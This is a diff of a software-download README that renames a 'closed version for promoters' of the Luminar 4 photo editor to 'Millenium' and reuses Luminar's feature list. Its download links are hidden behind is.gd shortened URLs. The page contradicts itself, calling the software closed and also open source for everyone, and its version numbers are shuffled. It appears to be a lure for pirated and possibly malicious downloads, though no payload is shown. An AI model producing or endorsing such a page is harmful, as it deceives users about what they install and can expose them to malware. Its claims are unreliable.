@@ -1,4 +1,4 @@
-# **Necessary software package**
+# **Millenium software package**
 -------------
 # Closed version for promoters.
 ### 💻 Only for Windows 7/8/8.1/10
@@ -9,11 +9,9 @@
 * RAM - 8 GB or more
 * Disk space - 10 GB free space
 
-![alt-текст](https://graydonschwartz.com/wp-content/uploads/2019/10/gif_AI-Sky-Replacement_3.gif "Luminar4")
+## Millenium is an open source for all users that everyone can use.
 
-## Luminar 4's revolutionary tools and AI technologies give superpowers for creative photo editing.
-
-## [⚡Luminar Version 4.2](https://is.gd/sQtkNQ):
+## [⚡ Millenium 2.7](https://is.gd/sQtkNQ):
 * NEW AI Augmented Sky Tool.
 * Face Features Detection Network.
 * Shine Removal Technology.
@@ -22,7 +20,7 @@
 * Improvements to ML Cache.
 * Third-party Plugin Implementation (PC users).
 
-## [⚡Luminar Version 4.1](https://is.gd/Shrtf9):
+## [⚡ Millenium Version 2.8](https://is.gd/Shrtf9):
 
 * Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays, and digital cinema uses.
 * Resetting tools is easier with an increased clickable area for each reset button.
